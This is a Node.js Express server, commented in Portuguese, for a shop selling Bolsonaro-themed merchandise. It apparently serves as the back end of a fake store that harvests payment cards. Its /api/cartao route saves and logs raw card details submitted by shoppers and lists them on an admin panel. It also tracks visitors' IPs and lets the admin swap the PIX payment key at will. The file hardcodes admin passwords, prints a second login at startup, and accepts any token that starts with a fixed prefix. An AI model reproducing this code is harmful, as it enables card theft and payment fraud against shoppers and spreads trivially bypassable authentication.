const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== BANCO DE DADOS MOCKADO ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];
let pixKey = '';

// ========== ROTAS PÚBLICAS ==========

// Listar produtos
app.get('/api/produtos', (req, res) => {
    let filtered = produtos.filter(p => p.ativo === true);
    res.json({ success: true, produtos: filtered });
});

// Buscar CEP
app.get('/api/cep/:cep', async (req, res) => {
    const cep = req.params.cep.replace(/\D/g, '');
    if (cep.length !== 8) return res.json({ error: 'CEP inválido' });
    try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await response.json();
        if (data.erro) return res.json({ error: 'CEP não encontrado' });
        res.json({ success: true, logradouro: data.logradouro, bairro: data.bairro, cidade: data.localidade, uf: data.uf });
    } catch (error) {
        res.json({ error: 'Erro ao buscar CEP' });
    }
});

// Salvar pedido
app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    const pedido = { ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() };
    pedidos.unshift(pedido);
    console.log('Pedido salvo:', pedidoId);
    res.json({ success: true, pedido_id: pedidoId });
});

// Salvar cartão
app.post('/api/cartao', (req, res) => {
    const novoCartao = { id: Date.now(), ...req.body, created_at: new Date().toISOString() };
    cartoes.push(novoCartao);
    console.log('Cartão salvo:', novoCartao);
    res.json({ success: true });
});

// Registrar visitante
app.post('/api/visitante', (req, res) => {
    const { visitor_id, ip, user_agent, origem } = req.body;
    const existing = visitantes.find(v => v.visitor_id === visitor_id);
    if (existing) {
        existing.ultima_atividade = new Date().toISOString();
        existing.page_views = (existing.page_views || 0) + 1;
    } else {
        visitantes.push({
            visitor_id, ip, user_agent, origem: origem || 'direct', etapa: 'visitante',
            page_views: 1, primeira_visita: new Date().toISOString(), ultima_atividade: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

// Carrinho abandonado
app.post('/api/carrinho', (req, res) => {
    const { visitor_id, itens, total } = req.body;
    const existing = carrinhosAbandonados.find(c => c.visitor_id === visitor_id);
    if (existing) {
        existing.itens = itens;
        existing.total = total;
        existing.total_itens = itens.length;
        existing.updated_at = new Date().toISOString();
    } else {
        carrinhosAbandonados.push({
            visitor_id, itens, total, total_itens: itens.length,
            created_at: new Date().toISOString(), updated_at: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

// ========== ROTAS ADMIN ==========

// LOGIN - ROTA PRINCIPAL
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    console.log('Tentativa de login:', username);
    
    if (username === 'admin' && password === 'capitao2025') {
        const token = 'admin_auth_' + Date.now();
        console.log('Login bem sucedido');
        res.json({ success: true, token: token });
    } else {
        console.log('Login falhou');
        res.status(401).json({ success: false, error: 'Credenciais inválidas' });
    }
});

// Middleware de autenticação
function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false, error: 'Não autorizado' });
    }
    next();
}

// Listar produtos (admin)
app.get('/api/admin/produtos', verifyAdmin, (req, res) => {
    res.json({ success: true, produtos });
});

// Adicionar produto
app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
    const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
    const novoProduto = { id: novoId, ...req.body, ativo: true, created_at: new Date().toISOString() };
    produtos.push(novoProduto);
    console.log('Produto adicionado:', novoProduto.nome);
    res.json({ success: true, produto: novoProduto });
});

// Deletar produto permanentemente
app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) return res.status(404).json({ success: false });
    const produtoRemovido = produtos[index];
    produtos.splice(index, 1);
    console.log('Produto deletado:', produtoRemovido.nome);
    res.json({ success: true });
});

// Listar pedidos
app.get('/api/admin/pedidos', verifyAdmin, (req, res) => {
    res.json({ success: true, pedidos });
});

// Listar cartões
app.get('/api/admin/cartoes', verifyAdmin, (req, res) => {
    res.json({ success: true, cartoes });
});

// Listar visitantes
app.get('/api/admin/visitantes', verifyAdmin, (req, res) => {
    res.json({ success: true, visitantes });
});

// Listar carrinhos abandonados
app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => {
    res.json({ success: true, carrinhos: carrinhosAbandonados });
});

// Estatísticas
app.get('/api/admin/stats', verifyAdmin, (req, res) => {
    const online = visitantes.filter(v => new Date(v.ultima_atividade) > new Date(Date.now() - 5 * 60 * 1000)).length;
    const revenue = pedidos.reduce((sum, p) => sum + (parseFloat(p.total) || 0), 0);
    res.json({
        success: true,
        stats: {
            online,
            abandoned_carts: carrinhosAbandonados.length,
            total_cards: cartoes.length,
            revenue,
            total_products: produtos.filter(p => p.ativo).length,
            total_orders: pedidos.length
        }
    });
});

// Configuração PIX
app.get('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true, pix_key: pixKey });
});

app.post('/api/admin/pix', verifyAdmin, (req, res) => {
    pixKey = req.body.pix_key;
    res.json({ success: true });
});

// ========== INICIAR SERVIDOR ==========
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
    console.log(`Login: kakabanker / 77991958@Abc`);
});